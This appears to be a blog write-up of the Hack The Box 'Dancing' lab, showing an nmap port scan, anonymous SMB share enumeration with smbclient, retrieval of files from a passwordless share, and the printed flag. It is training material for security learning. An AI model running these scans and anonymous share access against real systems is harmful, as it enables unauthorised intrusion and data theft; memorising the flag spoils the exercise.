---
layout: single
title: 'Dancing'
excerpt: 'Dancing is a very easy Windows machine which introduces the Server Message Block (SMB) protocol, its enumeration and its exploitation when misconfigured to allow access without a password.'
date: 2026-06-04
classes: wide
header:
  teaser: /assets/images/htb-writeup-dancing/dancing_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.svg
categories:
  - HTB Starting Point
tags:
  - Tier-0-Foundations
os: Windows
difficulty: Very Easy
release: 2021-09-30
ip: 10.129.96.189
---

{% include info-card.html %}

## Task 1

![Task 1](/assets/images/htb-writeup-dancing/Task 1.png)

## Task 2

![Task 2](/assets/images/htb-writeup-dancing/Task 2.png)

## Task 3

![Task 3](/assets/images/htb-writeup-dancing/Task 3.png)

<pre class="language-"><code class="language-">
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n 10.129.96.189 -oG allPorts
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-06-26 20:10 -05
Initiating Ping Scan at 20:10
Scanning 10.129.96.189 [4 ports]
Completed Ping Scan at 20:10, 0.19s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 20:10
Scanning 10.129.96.189 [65535 ports]
Discovered open port 135/tcp on 10.129.96.189
Discovered open port 139/tcp on 10.129.96.189
Discovered open port 445/tcp on 10.129.96.189
Discovered open port 49668/tcp on 10.129.96.189
Discovered open port 49665/tcp on 10.129.96.189
Discovered open port 49669/tcp on 10.129.96.189
Discovered open port 5985/tcp on 10.129.96.189
Discovered open port 49664/tcp on 10.129.96.189
Discovered open port 47001/tcp on 10.129.96.189
Discovered open port 49666/tcp on 10.129.96.189
Discovered open port 49667/tcp on 10.129.96.189
Completed SYN Stealth Scan at 20:11, 15.67s elapsed (65535 total ports)
Nmap scan report for 10.129.96.189
Host is up, received reset ttl 127 (0.10s latency).
Scanned at 2026-06-26 20:10:52 -05 for 16s
Not shown: 65479 closed tcp ports (reset), 45 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      REASON
135/tcp   open  msrpc        syn-ack ttl 127
139/tcp   open  netbios-ssn  syn-ack ttl 127
<span style="color: #bb66ff;">445/tcp   open  microsoft-ds syn-ack ttl 127</span>
5985/tcp  open  wsman        syn-ack ttl 127
47001/tcp open  winrm        syn-ack ttl 127
49664/tcp open  unknown      syn-ack ttl 127
49665/tcp open  unknown      syn-ack ttl 127
49666/tcp open  unknown      syn-ack ttl 127
49667/tcp open  unknown      syn-ack ttl 127
49668/tcp open  unknown      syn-ack ttl 127
49669/tcp open  unknown      syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 15.97 seconds
           Raw packets sent: 77062 (3.391MB) | Rcvd: 71647 (2.866MB)
</code></pre>

## Task 4

![Task 4](/assets/images/htb-writeup-dancing/Task 4.png)

<pre class="language-"><code class="language-">
❯ smbclient -L 10.129.96.189 -N

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	WorkShares      Disk      
SMB1 disabled -- no workgroup available
</code></pre>

## Task 5

![Task 5](/assets/images/htb-writeup-dancing/Task 5.png)

## Task 6

![Task 6](/assets/images/htb-writeup-dancing/Task 6.png)

<pre class="language-"><code class="language-">
❯ smbclient //10.129.96.189/WorkShares -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Mar 29 03:22:01 2021
  ..                                  D        0  Mon Mar 29 03:22:01 2021
  Amy.J                               D        0  Mon Mar 29 04:08:24 2021
  James.P                             D        0  Thu Jun  3 03:38:03 2021

		5114111 blocks of size 4096. 1753000 blocks available
smb: \> 
</code></pre>

## Task 7

![Task 7](/assets/images/htb-writeup-dancing/Task 7.png)

<pre class="language-"><code class="language-">
smb: \> get James.P\flag.txt 
getting file \James.P\flag.txt of size 32 as James.P\flag.txt (0,0 KiloBytes/sec) (average 0,0 KiloBytes/sec)
smb: \> get Amy.J\worknotes.txt 
getting file \Amy.J\worknotes.txt of size 94 as Amy.J\worknotes.txt (0,1 KiloBytes/sec) (average 0,1 KiloBytes/sec)
smb: \>
❯ ls
 allPorts   'Amy.J\worknotes.txt'   'James.P\flag.txt'
❯ catnp Amy.J\\worknotes.txt
- start apache server on the linux machine
- secure the ftp server
- setup winrm on dancing #                                                                                                                                                      
❯ catnp James.P\\flag.txt
<span style="color: #bb66ff;">5f61c10dffbc77a704d76016a22f1664#</span>                                                                                                                                                                                                                         
</code></pre>

## Submit Flag

![Submit Flag](/assets/images/htb-writeup-dancing/Task%208.png)

![You have solved Dancing!](/assets/images/htb-writeup-dancing/You have solved Dancing!.png)
